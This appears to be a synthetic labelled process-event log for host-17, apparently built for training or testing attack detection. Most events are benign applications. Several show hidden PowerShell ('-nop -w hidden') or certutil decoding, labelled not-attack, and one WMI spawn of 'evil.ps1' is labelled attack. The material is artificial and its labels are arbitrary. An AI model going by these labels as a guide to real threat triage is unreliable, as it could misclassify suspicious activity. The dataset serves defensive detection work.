+{"@timestamp": "2025-06-05T11:39:32.783119", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:09:37.478043", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:19:31.696584", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:29:21.886878", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:02:33.963933", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:52:54.000909", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:31:53.261994", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T10:18:10.041108", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:13:03.832195", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:54:44.126128", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:37:40.383419", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:01:00.779914", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T23:47:20.792420", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:57:11.010449", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:29:56.641427", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:35:57.028946", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:48:18.903168", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:13:31.010847", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T10:13:49.748071", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:05:55.105577", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:12:33.089328", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:22:18.433679", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:49:29.879013", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:45:01.186208", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:15:59.216565", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:25:45.702350", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:38:45.503929", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:27:31.159970", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:01:48.465973", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:37:16.637222", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:29:22.476807", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:06:30.169974", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:21:22.850702", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:45:57.333186", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:45:12.025558", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:20.860689", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:30:23.168587", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:02:02.150986", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:02:48.131592", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:22:12.413672", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:10:57.805461", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:30:12.806196", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:57:33.191974", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:52:30.492490", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:29:33.803865", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:39:17.007924", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:35:16.395178", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:10:57.850225", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:30:48.539868", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:04:33.186545", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T00:58:51.351507", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:25:20.573020", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:09:57.410388", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:35:02.645867", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:11:10.481723", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:53:04.808641", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:13:02.642247", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:27:14.336570", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:25:00.884293", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:21:41.491853", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:24:25.354133", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:50:35.754869", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:07:56.144422", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:53:05.105323", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:10:16.908395", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:49:38.319399", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:37:11.529197", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:18:20.600082", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:20:43.819749", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:25:02.480476", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:48:55.596279", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:30:36.147584", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:33:18.267300", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:45:26.487677", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:23:04.435822", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:49:05.680118", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:09:35.453327", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:57:53.534098", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:27:45.837209", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T03:49:10.714951", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:56:16.910285", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:50:54.683105", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:20:09.144769", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:36:05.275911", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:41.952979", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:00:58.023341", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:35:22.257135", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:35:10.399980", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:14:23.734277", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:21:35.184862", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:17:03.309228", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:04:40.062194", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:30:24.698817", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:32:27.812005", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:30:21.522078", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:52:03.390615", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:07:58.245341", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:29:05.599734", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:04:45.558822", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:11:20.668148", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T17:10:16.671277", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:19:18.961479", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:33:42.447384", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:57:43.226421", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:07:28.633558", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:53:35.166136", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:08:49.080402", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:04:45.734765", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:10:17.308741", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:13:19.871972", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T03:04:37.338905", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T05:00:16.570959", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:28:15.134379", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:12.361780", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:17:16.585854", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:49:31.056061", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:15:52.504684", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:48:24.690448", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:40:07.748204", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:52:21.636002", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:14:15.327942", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:52:13.793151", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:08:05.332244", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:44:16.019776", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:49:38.336181", "host": "host-17", "process": "wmiprvse.exe", "args": "spawn evil.ps1", "attack": true}
+{"@timestamp": "2025-06-05T22:47:16.426412", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:58:01.117903", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:34:12.078001", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:47:26.431758", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:46:41.598316", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:17:02.212413", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:24:43.850784", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:45:37.953902", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:18:17.101786", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T01:13:10.664070", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:28:47.630796", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:50:30.014134", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:33:33.498644", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:32:07.979219", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:22:40.830554", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:58:53.535684", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:29:07.739864", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:54:56.182515", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:40:38.331155", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:10:08.599311", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:18:15.413264", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:28:03.121121", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:57:48.669768", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T03:22:28.798279", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:34:39.545272", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T19:05:30.432097", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:11:25.730678", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:09:36.065713", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:18:28.125195", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:56:21.099858", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:55:37.028234", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:54:09.484341", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:35:14.716563", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:06:38.930051", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:01:47.937429", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T02:16:05.328898", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:15:28.329018", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:44:31.564175", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:31:46.360899", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:09:20.988821", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:30:24.790243", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:25:53.790251", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:25:28.795602", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:33:15.640004", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:08:47.972470", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:15:06.301014", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:05:53.865991", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:10:11.087362", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:08:10.668043", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:45:25.824223", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:53:15.840616", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:12:35.839028", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:56:13.055815", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T16:15:00.263185", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:20:21.787108", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:43:19.177480", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:25:36.945072", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:39:54.056154", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:14:34.361035", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:49:08.730520", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:12:12.881521", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:35:07.124576", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:54:24.478174", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T16:18:22.169170", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:53:24.138216", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:47:58.171182", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:35:18.810301", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:01:33.596933", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:10:16.302656", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:31:42.020828", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:17:22.537859", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T09:09:06.547010", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:10:24.820326", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:29:13.424177", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:48:12.888138", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:28:09.861079", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:25:59.944797", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:44:05.182657", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T14:12:38.006044", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:10:31.286548", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:01:41.763605", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:04:01.012855", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:53:09.199143", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:11:48.945618", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:10:04.053692", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:29:27.334908", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:54:16.832510", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:12:42.500392", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T09:40:49.727702", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:20:34.354944", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:01:50.025034", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:14:54.173110", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:40:22.161643", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:34:42.641409", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:43:39.875995", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:17:40.320039", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:11:26.541036", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:54:55.847469", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:20:24.896663", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:49:17.356927", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:46:53.533445", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:30:02.092937", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:13:51.052700", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:52:33.326203", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:26:05.212487", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:46:29.783089", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:19:37.108810", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:39:53.148019", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:21:17.266192", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:51:27.964577", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:18:18.067480", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T15:39:02.277341", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T18:03:48.232635", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:11:02.787235", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:14:33.237121", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:58:01.831541", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:15:14.376137", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:13:41.744524", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:33:57.880769", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:30:40.837306", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T22:05:08.667767", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:27:04.568804", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:45:16.152233", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:23:39.942815", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:04:21.257555", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:32:50.210101", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:51:35.384228", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:41:43.787512", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:46:09.854309", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:31:54.960171", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:57:06.252508", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:35:07.912354", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:48:31.697801", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:05:48.601769", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
